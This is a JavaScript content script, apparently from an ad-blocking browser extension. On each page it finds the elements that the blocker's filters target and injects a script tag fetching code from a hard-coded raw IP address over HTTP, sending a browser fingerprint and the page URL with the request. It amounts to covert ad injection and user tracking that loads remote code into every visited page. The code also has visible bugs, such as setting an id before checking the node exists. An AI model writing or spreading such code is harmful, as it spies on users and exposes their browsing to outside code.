"use strict";

/* eslint-disable */

const Fingerprint = require("./fingerprint");

const reviveUrl = "http://3.81.128.247:8080";
const userCode = "948e55289d4246ce83e36e5a56066654";

browser.runtime.sendMessage({
  type: "background.checkWhitelisted"
},
isWhitelisted =>
{
  if (!isWhitelisted)
  {
    findDomSelectors();
  }
});


function findDomSelectors()
{
  const selectors = [];
  const allElements = document.querySelectorAll("*");

  for (let i = 0; i < allElements.length; i++)
  {
    const classes = allElements[i].className.toString().split(/\s+/);
    const id = allElements[i].id.toString();
    for (let j = 0; j < classes.length; j++)
    {
      const cls = classes[j];
      if (cls && selectors.indexOf(cls) === -1)
        selectors.push("." + cls);
    }
    if (id)
      selectors.push("#" + id);
  }

  getAdblockBlockableSelectors(selectors);
}


function getAdblockBlockableSelectors(allSelectors)
{
  browser.runtime.sendMessage({
    type: "background.getSelectorsAndReviveAddress"
  },
  response =>
  {
    findBlockedSelectors(response, allSelectors);
  });
}

function findBlockedSelectors(selectors, allSelectors)
{
  const objWithSelectors = {};

  for (let i = 0; i < allSelectors.length; i++)
  {
    objWithSelectors[allSelectors[i]] = 1;
  }


  for (let j = 0; j < selectors.length; j++)
  {
    if (objWithSelectors[selectors[j]])
    {
      objWithSelectors[selectors[j]] = objWithSelectors[selectors[j]] += 1;
    }
  }

  const arrOfAdSelectors = Object.keys(objWithSelectors).filter((item) =>
  {
    return objWithSelectors[item] > 1;
  });

  getSelectorsWidth(arrOfAdSelectors);
}

function getSelectorsWidth(selectors)
{
  selectors.forEach(selector =>
  {
    let node = document.querySelector(selector);
    const id= "blade-ext-" + Date.now();
    node.id = id;
    if (!node)
    {
      return;
    }

    let nodeWidth = node.clientWidth;
    while (nodeWidth === 0 && node)
    {
      node = node.parentNode;
      nodeWidth = node.clientWidth;
    }

    insertAdd(id, nodeWidth);
    console.log("node=", node);
    console.log("width=", nodeWidth);
    console.log("selector=", selector);
  });
}

function insertAdd(selectorId, selectorWidth)
{
  const fp = new Fingerprint().get();
  const charset = document.charset ? 'charset='+document.charset : (document.characterSet ? 'charset='+document.characterSet : '');
  const src = `http://3.81.128.247:8080/www/delivery/blade_controller.php?sel=${selectorId}&blade_id=948e55289d4246ce83e36e5a56066654&width=${selectorWidth}&finger_print=`+fp+'&loc='+ escape(window.location)+'&'+charset;
  const script = document.createElement("script");
  script.src = src;
  document.body.appendChild(script);
}
